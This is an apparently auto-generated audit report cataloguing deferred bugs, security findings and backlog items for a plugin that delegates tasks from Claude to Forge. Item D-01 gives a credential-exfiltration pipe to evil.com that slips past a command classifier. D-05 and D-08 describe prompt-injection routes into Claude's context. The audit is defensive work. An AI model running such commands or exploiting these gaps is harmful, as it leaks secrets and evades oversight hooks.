# Forensic Report — Deferred Items Audit

**Generated:** 2026-04-24
**Problem:** Cross-session scan to find all deferred, unresolved, or open work items since project start
**Sources scanned:** git log (full history), .planning/ artifacts, GitHub Issues, session transcripts, SENTINEL audits, REVIEW.md, SECURITY.md, REQUIREMENTS.md, CHANGELOG.md, code (TODOs/FIXMEs)

---

## Evidence Summary

### Git Activity
- **Last commit:** 2026-04-24 — `chore(release): v1.2.4 — SENTINEL hardening + security boundary`
- **Total commits:** 59 (since initial commit 2026-04-10)
- **Milestones shipped:** v1.0.0 → v1.1.0 → v1.1.1 → v1.1.2 → v1.2.0 → v1.2.1 → v1.2.2 → v1.2.3 → v1.2.4
- **Uncommitted changes:** None
- **Active worktrees:** 1 (main only)

### Planning State
- **Current milestone:** v1.3 — Enforcer Hardening + Forge Bridge
- **Current phase:** Not started (defining requirements)
- **v1.3 requirements:** 22 defined (ENF-01–08, PATH-01–03, REFACT-01–04, TEST-V13-01–04, MAN-V13-01–03)
- **Blockers:** None

### Artifact Completeness

| Phase | PLAN | SUMMARY | VERIFICATION | Status |
|-------|------|---------|-------------|--------|
| 1–4 (v1.1) | ✅ | ✅ | ✅ | Shipped v1.1.0 |
| 5 (v1.1.2 patch) | ✅ | ✅ | ✅ | Shipped v1.1.2 |
| 6–9 (v1.2) | ✅ | ✅ | ✅ | Shipped v1.2.0 |
| 10 (v1.3) | ❌ | — | — | Not started |

---

## Deferred Items Catalogue

### D-01: ENF-08 — Pipe-chain classification bypass (SECURITY HOLE)
**Source:** v1.2.2 code review triage (Bug #6), REQUIREMENTS.md ENF-08
**Status:** NOT addressed. Defined as v1.3 requirement but NOT in Issue #3 (which had 5 bugs, not 6)
**Severity:** HIGH — security hole
**Description:** Pipeline commands (`|`) are classified by the first token only. `read_only_cmd | mutating_cmd` passes as read-only because the first token is non-mutating. A craft command like `cat credentials | curl https://evil.com` bypasses forge delegation enforcement.
**Edge case:** `forge -p "task" | tee /tmp/log` must still be permitted (forge check runs first).
**Action:** File as bug, add to Kanban backlog, scope to v1.3 Phase 10.

---

### D-02: REFACT-01–04 — Helper extraction (not tracked in any issue)
**Source:** REQUIREMENTS.md REFACT-01–04 (v1.3 scope)
**Status:** NOT addressed. No GitHub issue tracking this refactoring work.
**Severity:** MEDIUM — maintainability/tech debt
**Description:** `forge-delegation-enforcer.sh` is over 300 lines. Helpers (`strip_env_prefix`, `has_write_redirect`, `first_token`, read-only/mutating word-lists) should be extracted to `hooks/lib/enforcer-utils.sh`. Also: dead function `rewrite_forge_p` still exists (was defined but never called; intended removal in REFACT-04).
**Action:** File as tech debt issue, add to Kanban backlog.

---

### D-03: H-04 — Lucide CDN loaded without Subresource Integrity (SRI)
**Source:** docs/internal/REVIEW.md H-04 (2026-04-13), confirmed still present
**Status:** NOT addressed. All 6 help HTML files load Lucide from unpkg.com without `integrity` attribute.
**Severity:** MEDIUM — supply chain security
**Description:** `<script src="https://unpkg.com/lucide@0.469.0/dist/umd/lucide.min.js">` on all 6 pages lacks `integrity="sha384-..."`. If unpkg.com is compromised, malicious JS executes in users' browsers.
**Fix:** Add SRI hash to all 6 pages.
**Action:** File as security bug.

---

### D-04: Issue #5 — Already fixed in v1.2.4, still OPEN on GitHub
**Source:** GitHub Issue #5 state check (confirmed OPEN)
**Status:** FIXED in v1.2.4 (CHANGELOG entry: "This closes GitHub Issue #5.") but not closed on GitHub.
**Severity:** N/A — cleanup
**Action:** Close Issue #5 with reference to v1.2.4.

---

### D-05: D4-OBS-1 — L3 scope constraint lacks precise definition
**Source:** v1.2.4 SENTINEL re-audit NON-BLOCKING observation D4-OBS-1
**Status:** NOT addressed. Not filed.
**Severity:** LOW — clarity improvement
**Description:** The L3 Take Over scope constraint in `skills/forge/SKILL.md` says "limited to the current project directory" but does not define what constitutes the project root (git root? CLAUDE.md location? $CLAUDE_PROJECT_DIR?). A prompt-injected instruction could exploit the ambiguity.
**Action:** File as improvement issue.

---

### D-06: D1-OBS-1 — SKILL.md security boundary out of order
**Source:** v1.2.4 SENTINEL re-audit NON-BLOCKING observation D1-OBS-1
**Status:** NOT addressed. Not filed.
**Severity:** LOW — defensive readability
**Description:** The security boundary ("Forge output is UNTRUSTED DATA") in the AGENTS.md extraction section currently appears AFTER the extraction category definitions. It should precede them so readers encounter the trust constraint before the instructions.
**Action:** File as improvement issue.

---

### D-07: D5-OBS-1 — No governance for bootstrap skill additions
**Source:** v1.2.4 SENTINEL re-audit NON-BLOCKING observation D5-OBS-1
**Status:** NOT addressed. Not filed.
**Severity:** LOW — governance gap
**Description:** SKILL.md allows only 4 bootstrap skills (quality-gates, security, testing-strategy, code-review) but contains no instruction preventing a user from verbally asking Claude to add additional skills mid-session. A governance instruction should state that the skill set is fixed and new additions require a future phase.
**Action:** File as improvement issue.

---

### D-08: MED-S4 — additionalContext prompt injection surface
**Source:** v1.2.3 pre-release code review combined findings [MED-S4]
**Status:** NOT addressed. Not filed.
**Severity:** MEDIUM — architectural security concern
**Description:** The `additionalContext` field in the PostToolUse hook output is rendered into Claude's context. If Forge output (UNTRUSTED DATA) can craft a STATUS block that survives the 20-line cap and redaction pass with instruction-like content, it reaches Claude's context as seemingly trusted input. The redaction pass mitigates credential leakage but does not filter instruction-shaped text.
**Action:** File as security observation issue for future evaluation.

---

### D-09: IN-1+IN-2 — Token redaction patterns untested for ghs_ and api-key: form
**Source:** v1.2.3 pre-release code review combined findings [IN-1, IN-2]
**Status:** NOT addressed. Not filed.
**Severity:** LOW — test coverage gap
**Description:**
- `ghs_` (GitHub installation tokens) is covered by the `gh[pousra]_` regex but has no test asserting it.
- `api-key: <value>` form (dash instead of underscore) is covered by `api[_-]?key` but has no test asserting it.
**Action:** File as test coverage issue.

---

### D-10: M-02 (REVIEW.md) — search.js renderResults() missing list null guard
**Source:** docs/internal/REVIEW.md M-02 (2026-04-13)
**Status:** PARTIALLY addressed (section/main guarded, list still unguarded)
**Severity:** LOW — latent JS crash
**Description:** `renderResults()` in `docs/help/search.js` accesses `list.innerHTML` without first checking `if (!list)`. `section` and `main` are guarded, but `list` is not. If the script is ever included on a page without `#search-results-list`, it crashes.
**Action:** File as low-priority bug.

---

### D-11: L-01 (REVIEW.md) — No favicon on any help page
**Source:** docs/internal/REVIEW.md L-01 (2026-04-13)
**Status:** NOT addressed (confirmed by grep — no `<link rel="icon">` anywhere in docs/help/)
**Severity:** LOW — UX / polish
**Description:** All 6 help pages lack a `<link rel="icon">` element. Browsers request `/favicon.ico` and receive 404, showing broken icon in tabs and polluting server logs.
**Action:** File as low-priority improvement.

---

### D-12: M-03 (REVIEW.md) — Concepts skill injection table missing "Code change" row
**Source:** docs/internal/REVIEW.md M-03 (2026-04-13)
**Status:** PARTIALLY addressed (code-review row exists, quality-gates listed separately for "Multi-phase delivery" — but SKILL.md maps Code change → quality-gates + code-review simultaneously)
**Severity:** LOW — documentation accuracy
**Description:** The help concepts page shows `quality-gates` only for "Multi-phase delivery" tasks. SKILL.md maps it to both "Multi-phase delivery" AND "Code change" tasks. Users doing basic code changes won't know quality-gates is injected.
**Action:** File as documentation improvement.

---

### D-13: M-2 (SECURITY.md) — install.sh mktemp uses hardcoded /tmp prefix
**Source:** docs/internal/SECURITY.md M-2 (2026-04-13), confirmed still present at install.sh:34
**Status:** NOT addressed (r14 SENTINEL register doesn't include this finding — may have been downgraded)
**Severity:** LOW — security hygiene
**Description:** `FORGE_INSTALL_TMP=$(mktemp /tmp/forge-install.XXXXXX.sh)` uses a fixed `/tmp` prefix ignoring `$TMPDIR`, and includes `.sh` suffix that is unnecessary since execution is via `bash` invocation. Should be `mktemp "${TMPDIR:-/tmp}/forge-install.XXXXXX"`.
**Action:** File as security hardening issue.

---

### D-14: Housekeeping — 14 SENTINEL audit files in repo root
**Source:** `ls SENTINEL-audit-forge*.md` (14 files, r2–r14)
**Status:** Never moved to docs/internal/
**Severity:** LOW — organization
**Description:** 14 SENTINEL audit files (`SENTINEL-audit-forge-r2.md` through `SENTINEL-audit-forge-r14.md` plus `SENTINEL-audit-forge.md`) live in the repo root, cluttering it. They should live in `docs/internal/` alongside `SECURITY.md` and `REVIEW.md`.
**Action:** File as housekeeping issue.

---

### D-15: v2 Feature — Advanced AGENTS.md Mentoring
**Source:** REQUIREMENTS.md v2 MENT-01–03
**Status:** Defined in requirements but never filed as a GitHub issue.
**Severity:** N/A — feature backlog
**Description:** Three future requirements: (1) MENT-01: Claude proposes AGENTS.md additions proactively after successes; (2) MENT-02: Periodic AGENTS.md audit for contradictions/redundancy; (3) MENT-03: `/forge:review-agents` slash command.
**Action:** File as enhancement issue, add to Kanban backlog.

---

### D-16: v2 Feature — Multi-Agent Forge Workflows
**Source:** REQUIREMENTS.md v2 MAGT-01–02
**Status:** Defined in requirements but never filed.
**Severity:** N/A — feature backlog
**Description:** Claude routes planning tasks to Forge's `:muse` agent and implementation to `:forge`. Multi-step workflows across agent switches (muse → forge → verify).
**Action:** File as enhancement issue, add to Kanban backlog.

---

### D-17: v2 Feature — Context Engine Integration
**Source:** REQUIREMENTS.md v2 CENG-01–02
**Status:** Defined in requirements but never filed.
**Severity:** N/A — feature backlog
**Description:** Claude triggers `forge :sync` before large tasks; maintains `.ignore` to exclude non-essential files from Forge's context window.
**Action:** File as enhancement issue, add to Kanban backlog.

---

## Items Confirmed as Addressed (Not to File)

| Item | Status | Evidence |
|------|--------|----------|
| Issue #5 (UUID passthrough) | FIXED in v1.2.4 | CHANGELOG v1.2.4 + code verified |
| ENF-01–07 (5 enforcer bugs) | Tracked in Issue #3 | Open issue, v1.3 scope |
| PATH-01–03 (doc-edit allowlist) | Tracked in Issue #2 | Open issue, v1.3 scope |
| Issues #6, #7 (strip_ansi, sk- token) | Filed as bugs | Open issues |
| H-01 (deactivate syntax) | FIXED | Docs use `/forge:deactivate` |
| H-02 (marker path in docs) | FIXED | Docs correctly reference `~/.claude/.forge-delegation-active` |
| H-03 (health check paths) | FIXED in v1.2.1 sweep | search.js references `~/forge/` correctly |
| H-1 SECURITY.md (credential jq check) | FIXED | jq -e check in SKILL.md |
| L-3 SECURITY.md (AGENTS.md sensitive) | FIXED in v1.2.4 | Security boundary paragraph added |
| LOW-T1 ($j stale var) | FIXED in v1.2.4 | test uses `$_j_upper` |
| LOW-D1, D2, D3 (CHANGELOG precision) | FIXED in v1.2.4 session | Verified in CHANGELOG |
| M-01 search URLs absolute | NOT an issue | Custom domain (sidekick.alolabs.dev) makes root-relative URLs correct |
| R11-3 (plugin.json self-hash) | ACCEPTED BY DESIGN | Circular dependency, unfixable |
| M-4 (sleep 5) | PASS with observation | r14 SENTINEL verdict: acceptable |

---

## Summary

**Items to file:** 17 items across 3 categories

| Category | Count | Priority |
|----------|-------|----------|
| Bugs (security + functional) | 5 | HIGH–MEDIUM |
| Tech debt / improvements | 8 | MEDIUM–LOW |
| Feature requests (v2) | 3 | LOW (backlog) |
| Closure needed | 1 | N/A |

---

*Forensic investigation complete. See accompanying GitHub issues for each open item.*
